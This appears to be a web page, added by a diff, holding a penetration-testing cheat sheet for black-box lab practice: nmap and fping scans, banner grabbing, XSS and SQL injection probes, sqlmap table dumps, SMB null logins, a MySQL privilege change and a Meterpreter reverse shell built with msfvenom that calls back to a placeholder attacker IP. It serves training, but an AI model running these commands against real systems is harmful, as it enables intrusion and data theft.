@@ -1,0 +1,227 @@
+<h1 id="cheat-sheet">Cheat Sheet</h1>
+
+<p>This cheat sheet is a list of commands to help with the black box
+pen test engagements.</p>
+
+<h2 id="networking">Networking</h2>
+
+<p>Check routing table information</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ route
+$ ip route
+</code></pre></div></div>
+
+<p>Add a network to current route</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ip route add 192.168.10.0/24 via 10.175.3.1
+$ route add -net 192.168.10.0 netmask 255.255.255.0 gw 10.175.3.1
+</code></pre></div></div>
+
+<p>DNS</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nslookup mysite.com
+$ dig mysite.com
+</code></pre></div></div>
+
+<h2 id="subdomain-enumeration">Subdomain Enumeration</h2>
+
+<ul>
+  <li><a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a></li>
+  <li><a href="https://dnsdumpster.com/">DNSdumpster</a></li>
+</ul>
+
+<h2 id="footprinting--scanning">Footprinting &amp; Scanning</h2>
+
+<p>Find live hosts with fping or nmap</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ fping -a -g 172.16.100.40/24 2&gt;/dev/null | tee alive_hosts.txt
+$ nmap -sn 172.16.100.40/24 -oN alive_hosts.txt
+</code></pre></div></div>
+
+<p>nmap scan types</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-sS: TCP SYN Scan (aka Stealth Scan)
+-sT: TCP Connect Scan 
+-sU: UDP Scan
+-sn: Port Scan
+-sV: Service Version information
+-O: Operating System information
+</code></pre></div></div>
+
+<h3 id="spotting-a-firewall">Spotting a Firewall</h3>
+
+<p>If an nmap TCP scan identified a well-known service, such as a web server, but
+cannot detect the version, then there may be a firewall in place.</p>
+
+<p>For example:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE  SERVICE  REASON          VERSION
+80/tcp  open   http?    syn-ack ttl 64
+</code></pre></div></div>
+
+<p>Another example:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>80/tcp  open   tcpwrapped 
+</code></pre></div></div>
+
+<p><strong>“tcpwrapped”</strong> means the TCP handshake was completed, but the remote host
+closed the connection without receiving any data.</p>
+
+<p>These are both indicators that a firewall is blocking our scan with the target!</p>
+
+<p>Tips:</p>
+<ul>
+  <li>Use “–reason” to see why a port is marked open or closed</li>
+  <li>If a “RST” packet is received, then something prevented the connection - probably a firewall!</li>
+</ul>
+
+<h2 id="masscan">Masscan</h2>
+<p>Masscan is designed to scan thousands of IP addresses at once.</p>
+
+<h2 id="vulnerability-assessment">Vulnerability Assessment</h2>
+
+<p>Use the information from the Enumeration/Footprinting phases to find a vulnerable threat vector.</p>
+
+<p>Below are some helpful Vulnerability assessment resources:</p>
+<ul>
+  <li>Searchsploit</li>
+  <li>ExploitDB</li>
+  <li>Msfconsole search command</li>
+  <li>Google</li>
+  <li>Nessus</li>
+</ul>
+
+<h2 id="web-server-fingerprinting">Web Server Fingerprinting</h2>
+
+<p>Use netcat for HTTP banner grabbing:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc &lt;target addr&gt; 80
+HEAD / HTTP/1.0
+</code></pre></div></div>
+
+<p>Use OpenSSL for HTTPS banner grabbing:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ openssl s_client -connect target.site:443
+HEAD / HTTP/1.0
+</code></pre></div></div>
+
+<p>httprint is a web fingerprinting tool that uses <strong>signature-based</strong> technique
+to identify web servers. This is more accurate since sysadmins can customize
+web server banners.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ httprint -P0 -h &lt;target hosts&gt; -s &lt;signature file&gt;
+</code></pre></div></div>
+
+<h2 id="directory-and-file-enumeration">Directory and File Enumeration</h2>
+
+<p>Pick your favorite URI Enumeration tool</p>
+<ul>
+  <li>Gobuster - fast, multi-threaded scanner</li>
+  <li>Dirbuster - nice GUI</li>
+  <li>Dirb - recursively scans directories</li>
+</ul>
+
+<h2 id="xss">XSS</h2>
+
+<p>Look to exploit user input coming from:</p>
+<ul>
+  <li>Request headers</li>
+  <li>Cookies</li>
+  <li>Form inputs</li>
+  <li>POST parameters</li>
+  <li>GET parameters</li>
+</ul>
+
+<p>Check for XSS</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;i&gt;some text&lt;/i&gt;
+</code></pre></div></div>
+
+<p>Steal cookies:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre></div></div>
+
+<h2 id="sql-injection">SQL Injection</h2>
+
+<p>Same injection points as XSS.</p>
+
+<p>Boolean Injection:</p>
+<ul>
+  <li>and 1=1; – -</li>
+  <li>or ‘a’=’a’; – -</li>
+</ul>
+
+<p>Once you determine that a site is vulnerable to SQLi, automate with SQL Map.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u &lt;url&gt;
+$ sqlmap -u &lt;url&gt; -p &lt;parameter&gt;
+$ sqlmap -u &lt;url&gt; --tables
+$ sqlmap -u &lt;url&gt; -D &lt;database name&gt; -T &lt;table name&gt; --dump
+</code></pre></div></div>
+
+<h2 id="windows-shares-enumeration">Windows Shares Enumeration</h2>
+
+<p>Check what shares are available on a host</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ smbclient -L //ip 
+$ enum4linux -a ip_address
+</code></pre></div></div>
+
+<h2 id="smb-null-attack">SMB Null Attack</h2>
+<p>Try to login without a username or password:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ smbclient //ip/share -N
+</code></pre></div></div>
+
+<h2 id="mysql-database-commands">MySQL Database commands</h2>
+
+<p>Login to MySQL with password</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ mysql --user=root --port=13306 -p -h 172.16.64.81
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; SHOW databases;
+&gt; SHOW tables FROM databases;
+&gt; USE database;
+&gt; SELECT * FROM table;
+</code></pre></div></div>
+
+<p>Change table entry values</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Add the user tracking1 to the "adm" group
+&gt; update users set adm="yes" where username="tracking1";
+</code></pre></div></div>
+
+<h2 id="meterpreter-reverse-shell">Meterpreter reverse shell</h2>
+
+<ol>
+  <li>Find vulnerability in target (e.g. LFI/RFI)</li>
+  <li>Set up a Metasploit listener
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+set payload linux/x64/meterpreter_reverse_tcp # or any payload you wish
+set lhost &lt;MY IP&gt;
+set lport &lt;PORT&gt;  # set to a port open on the target to bypass firewall
+run
+</code></pre></div>    </div>
+  </li>
+  <li>Create a matching meterpreter-based executable using msfvenom
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenon -p linux/x64/meterpreter_reverse_tcp lhost=&lt;MY IP&gt; lport=&lt;PORT&gt; -f elf -o meter
+</code></pre></div>    </div>
+  </li>
+  <li>Upload the payload to target (e.g LFI/RFI)</li>
+</ol>
+
+<h2 id="adding-virtual-hosts">Adding Virtual Hosts</h2>
+
+<p>In the black box practice labs, we had to add a virtual host to /etc/hosts in
+order to connect to the webpage.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo vim /etc/hosts
+&lt;IP addr&gt;	static.foobar.org
+</code></pre></div></div>
+
+<h2 id="misc">Misc</h2>
+
+<ul>
+  <li>Found a webshell/admin panel on a site?
+    <ul>
+      <li>Run phpinfo(); to determine if it is a PHP shell</li>
+    </ul>
+  </li>
+  <li>Try to get a reverse shell connection</li>
+  <li>Check for flag in the user’s home directory</li>
+  <li>Enumerate, enumerate, enumerate</li>
+</ul>
+
+<p>Big Thanks for JasonTurley.</p>
